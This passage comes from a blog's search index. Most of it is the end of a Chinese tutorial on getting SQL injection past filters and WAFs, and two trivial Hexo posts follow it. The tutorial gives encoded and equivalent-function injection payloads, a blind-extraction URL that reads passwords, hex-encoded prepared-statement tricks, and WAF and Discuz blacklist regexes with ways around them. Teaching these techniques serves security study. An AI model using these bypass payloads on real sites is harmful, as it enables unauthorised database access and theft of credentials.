...]<br><br>value_list:<br> <span class="hljs-keyword">value</span>[, <span class="hljs-keyword">value</span>][, ...]<br><br>column_designator:<br> column_index<br></code></pre></td></tr></table></figure><p>例如直接列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>), <span class="hljs-type">ROW</span>(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);<br></code></pre></td></tr></table></figure><blockquote><p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p></blockquote><h2 id="使用编码绕过过滤"><a href="#使用编码绕过过滤" class="headerlink" title="使用编码绕过过滤"></a>使用<strong>编码</strong>绕过过滤</h2><p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p><p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p><h2 id="使用等价函数绕过过滤"><a href="#使用等价函数绕过过滤" class="headerlink" title="使用等价函数绕过过滤"></a>使用<strong>等价函数</strong>绕过过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br><br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br><br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br><br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br><br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br><br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br><br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br><br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="补充：进行过滤的几种思路"><a href="#补充：进行过滤的几种思路" class="headerlink" title="补充：进行过滤的几种思路"></a>补充：进行过滤的几种思路</h2><h3 id="黑名单字符替换"><a href="#黑名单字符替换" class="headerlink" title="黑名单字符替换"></a>黑名单字符替换</h3><p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p><p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>在一些waf或者cms会见到类似如下的防护代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confi</span><br><span class="hljs-string">rm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)</span><br><span class="hljs-string">\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;</span><br><span class="hljs-string">|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\(|@&#123;1</span><br><span class="hljs-string">,2&#125;\w+?\s*|\s+?.+?|.*(`|&#x27;|\&quot;).+(`|&#x27;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&#x27;|\&quot;).*?(`|&#x27;|\&quot;)\s*)SET|INSER</span><br><span class="hljs-string">T\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s</span><br><span class="hljs-string">select|\bunion\b|select\s.+?&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p><p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p><p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p><p>例如discuz的防护代码 <code>_do_query_safe</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dfunction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;load_file&#x27;</span>,<span class="hljs-string">&#x27;hex&#x27;</span>,<span class="hljs-string">&#x27;substring&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;daction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;intooutfile&#x27;</span>,<span class="hljs-string">&#x27;intodumpfile&#x27;</span>,<span class="hljs-string">&#x27;unionselect&#x27;</span>,<span class="hljs-string">&#x27;(select&#x27;</span>, <span class="hljs-string">&#x27;un</span><br><span class="hljs-string">ionall&#x27;</span>, <span class="hljs-string">&#x27;uniondistinct&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dnote&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/*&#x27;</span>,<span class="hljs-string">&#x27;*/&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>...<br><span class="hljs-variable">$clean</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-z0-9_\-\(\)#\*\/\&quot;]+/is&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$clean</span>));<br>...<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$fun</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$clean</span>, <span class="hljs-variable">$fun</span> . <span class="hljs-string">&#x27;(&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-1&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码首先将SQL语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p><p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> test3<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> substr(test2,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者可以使用多语句的方式执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d2074657374</span>;<br><span class="hljs-keyword">prepare</span> s <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">execute</span> s;<br></code></pre></td></tr></table></figure><p>也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler <span class="hljs-keyword">user</span> <span class="hljs-keyword">open</span>;<br>handler <span class="hljs-keyword">user</span> read <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>这是最高级的方式，模仿MySQL对SQL的分析，waf对用户的输入进行语法语义分析，如果符合MySQL的语法，就判断为SQL注入从而阻断</p><p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p><p>例如我们上面说的MySQL8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/blogs/test/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/blogs/uncategorized/hello-world/"/>
    <url>/blogs/uncategorized/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
